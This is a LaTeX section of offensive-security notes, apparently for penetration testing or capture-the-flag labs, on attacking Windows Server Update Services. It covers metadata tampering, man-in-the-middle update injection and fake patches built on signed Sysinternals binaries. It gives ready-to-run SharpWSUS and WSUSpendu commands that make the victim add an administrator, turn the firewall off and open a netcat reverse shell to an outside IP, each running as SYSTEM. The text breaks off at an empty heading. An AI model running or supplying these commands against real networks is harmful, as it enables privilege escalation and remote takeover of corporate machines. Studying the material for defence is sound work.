
\section{attacking}

\subsection{WSUS Metadata Tampering}
Although the update files themselves are signed by Microsoft and cannot be modified
without invalidating the signature, an attacker is free to modify the update metadata, or
even create fake updates for the client to install.

Windows Update will verify that each update is signed by Microsoft. However, there is
no specific ‘Windows Update’ signing certificate – any file that is signed by a Microsoft
CA will be accepted. By injecting an update that uses the CommandLineInstallation
update handler, an attacker can cause a client to run any Microsoft-signed executable,
even one that was not intended to be used in Windows Update. Even better, the
executable can be run with arbitrary arguments. Therefore we need to find a suitable
executable that will allow arbitrary commands to be executed.

Our initial thought was to create an update that used cmd.exe to run arbitrary
commands. However cmd.exe is not actually signed, nor are most of the executables in
a standard Windows installation. However Microsoft’s SysInternals tools are signed. The
PsExec SysInternals utility, which is normally used to run commands on remote systems
can also be used to run commands as the current user. By injecting an update that uses
PsExec, the update XML can specify any arguments for PsExec, therefore allowing the
attacker to run arbitrary commands. See Appendix 3 for a full example of how to inject
an update.

\subsection{WSUS Update Injection Attack}
WSUS deployments that are not configured to use SSL are vulnerable to man-in-the-
middle attacks. A network-based attacker can use ARP spoofing or WPAD injection
attacks to intercept and modify the SOAP requests between clients and the WSUS server,
and perform the metadata tampering described above.

In corporate environments where user proxy settings are not locked down, a low-
privileged user could update their proxy settings to point at a local man-in-the-middle
proxy server that would perform the metadata injection.

Context have tested both of these scenarios and found them to be effective. The
executable specified by the injected update is run as 
\verb+NT AUTHORITY\SYSTEM+.

A disadvantage of PsExec is that some anti-virus solutions such as Sophos detect it as a
‘hacking tool’. We identified another SysInternals tool, \verb+BgInfo+ as an alternative to
PsExec. BgInfo normally used to display system details on the desktop background.

\verb+BgInfo+ allows custom fields to be displayed, including fields generated from VBScript

An attacker could use BgInfo in place of PsExec, hosting its configuration file on an
unauthenticated Windows share. This allows full command execution via the VBScript
file.

\subsection{Create a malicious patch}

{\bf WSUS is restricted to executing only Microsoft-signed binaries}. To craft genuine-looking but malicious patch, we will utilize \verb+PSExec+ from Sysinternals, a signed Microsoft binary that allows us to execute commands.


There may be situations, commonly, when  this attack is performed using only a WSUS Administrator account that is not a member of the WSUS Administrators group. When the update is approved, it will fail to download the PSExec64.exe file. To fix this error, The PSExec64.exe can by copiedto the WSUScontent directory and renamed as expected by the WSUS Service.  WSUScontent directory and the filename can be found in eventlogs. The WSUS Service will generate an event id 364 if the Content file download failed:
\begin{verbatim}
Get-WinEvent -LogName Application | Where-Object { $_.Id -eq 364 } |fl
\end{verbatim}


\subsubsection{SharpWSUS}


\begin{verbatim}
SharpWSUS.exe create `
    /payload:"C:\Tools\sysinternals\PSExec64.exe" `
    /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators <user> /add ; netsh advfirewall set allprofiles state off" `
    /title:"NewAccountUpdate"

SharpWSUS.exe create `
    /payload:"C:\programdata\ps.exe" `
    /args:" -accepteula -s -d c:\programdata\nc64.exe -e cmd.exe 10.10.14.6 445" `
    /title:"CVE-2022-30190"
\end{verbatim}

will provide the next commands (approve... )
\begin{verbatim}
SharpWSUS.exe approve /updateid:<id> /computername:<target_fqdn> /groupname:"jubeaz"
SharpWSUS.exe check /updateid:<id> /computername:<target_fqdn>
\end{verbatim}


Note: If updates approved by SharpWSUS.exe are not being installed, try creating a new update and approving it manually. 

\begin{verbatim}
SharpWSUS.exe check /updateid:<update_id> /computername:<target_fqdn>
\end{verbatim}


\subsubsection{WSUSpendu}

\href{https://github.com/AlsidOfficial/WSUSpendu.git}{WSUSpendu}  allow to
create a new update, inject it in the WSUS server database, and distribute it
to the appropriate client. The binary will then be executed on the client under
the SYSTEM account, with the update-provided arguments.
\begin{verbatim}
.\Wsuspendu.ps1 -Inject `
    -PayloadFile .\PsExec64.exe `
    -PayloadArgs '-accepteula -s -d cmd.exe /c "net localgroup Administrators <user> /add"' `
    -ComputerName dc.outdated.htb
\end{verbatim}

\subsubsection{Thunder Woosus}